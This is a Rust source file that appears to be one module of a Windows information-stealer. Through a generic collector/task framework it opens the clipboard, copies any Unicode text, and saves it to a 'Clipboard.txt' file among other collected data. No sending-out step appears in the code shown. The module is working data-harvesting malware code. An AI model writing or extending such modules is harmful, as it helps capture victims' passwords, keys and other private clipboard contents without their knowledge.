use crate::alloc::borrow::ToOwned;
use alloc::string::String;
use collector::Collector;
use core::ptr::{null_mut, slice_from_raw_parts};
use filesystem::path::Path;
use filesystem::{FileSystem, WriteTo};
use tasks::{parent_name, Task};
use windows_sys::Win32::System::DataExchange::{CloseClipboard, GetClipboardData, OpenClipboard};
use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};

pub(super) struct ClipboardTask;

impl<C: Collector, F: FileSystem> Task<C, F> for ClipboardTask {
    parent_name!("Clipboard.txt");

    fn run(&self, parent: &Path, filesystem: &F, _: &C) {
        if unsafe { OpenClipboard(null_mut()) } == 0 {
            return;
        }

        let handle = unsafe { GetClipboardData(13u32) };
        if handle.is_null() {
            return;
        }

        let ptr = unsafe { GlobalLock(handle) };
        if ptr.is_null() {
            unsafe {
                CloseClipboard();
            }
            return;
        }

        let mut len = 0;
        let mut cur = ptr as *const u16;
        unsafe {
            while *cur != 0 {
                len += 1;
                cur = cur.add(1);
            }
        }

        let slice = slice_from_raw_parts(ptr as *const u16, len);
        let str = unsafe { String::from_utf16_lossy(&*slice) };

        unsafe {
            GlobalUnlock(handle);
            CloseClipboard();
        }

        let str = str.trim();
        if str.is_empty() {
            return;
        }

        let _ = str.write_to(filesystem, parent);
    }
}
